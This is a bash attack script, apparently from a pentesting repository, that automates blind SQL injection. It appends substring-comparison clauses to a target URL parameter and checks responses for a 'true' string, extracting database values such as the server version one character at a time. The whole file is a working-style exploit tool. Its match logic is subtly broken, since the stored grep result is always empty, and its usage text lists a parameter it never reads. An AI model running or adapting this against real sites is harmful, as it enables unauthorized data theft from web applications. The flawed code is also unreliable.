#!/bin/bash
#https://github.com/Plotkine/Pentesting
#this is a script finding the n first characters of a query by performing a blind SQLi (substring technique)

#colors: white=\e[97m red=\e[91m green=\e[92m
#font: normal= \033[0m bold=\033[1m

#edit following line:
export truestring="Image found" #application output when the result of the SQL query is true

echo -e "\e[91m\033[1mDon't forget to change the truestring variable in the script\033[0m\e[97m" #bold red

#charset
export charset=`echo {0..9} {A..z} \. \: \, \; \- \_ \@` #charset for queried field 
echo -e "Charset: 0..9 A..z . : , ; - _ @"

#############################################################################################

#number of parameters check
if (( $#<3 || $#>3 ))
then
        echo -e "\e[92mUsage:\e[97m bash blind_sqli.sh [URL] [query] [maxlength]" #green
        echo ""
        echo -e "\e[37m- URL        = target website, with valid PHP parameter"
        echo -e "- query      = DBMS field queried"
        echo -e "- truestring = application output when the result of the query is true"
        echo -e "- maxlength  = number of chars to be extracted from the query\e[97m"
        echo -e ""
        echo -e "\e[92mExample:\e[97m bash blind_sqli.sh http://target.site?id=1 @@version 5" #green
        echo ""
        exit 0
fi

#URL check
export URL=$1
wget $1 -q -T 3 #trying to reach the URL within 3 seconds
if [ "$?" != "0" ]
then
   echo ""
   echo -e "Error: \e[91mHost unreachable\e[97m"
   exit 0
fi

##############################################################################################

export query=$2
export maxlength=$3
export result=""

echo "Getting $maxlength first chars of $query..."
echo ""

for ((j=1;j<$maxlength+1;j+=1)) #j=position in the @@version string
do
        for i in $charset #testing every char of charset
        do
                export try=`wget "$URL' and substring($query,$j,1)='$i" -T 3 -q -O - |grep "$truestring" &>/dev/null` #-T 3 = timeout 3sec
                                                              #&>/dev/null = > /dev/null 2>&1 = redirecting STDERR and STDOUT to /dev/null
                
                if [ "$try" == "$truestring" ] #found
                then
                        echo -e "substring($query,$j,1): \e[92mOK\e[97m" #green
                        export result+=$i
                        break
                fi
        done
        if [ "$try" != "$truestring" ] #not found
        then
                echo -e "substring($query,$j,1): \e[31mFail\e[97m" #red
        fi
done

###############################################################################################

#output
if [ "$result" != "" ]
then
echo -e "Result: \e[32m$result" #green
fi
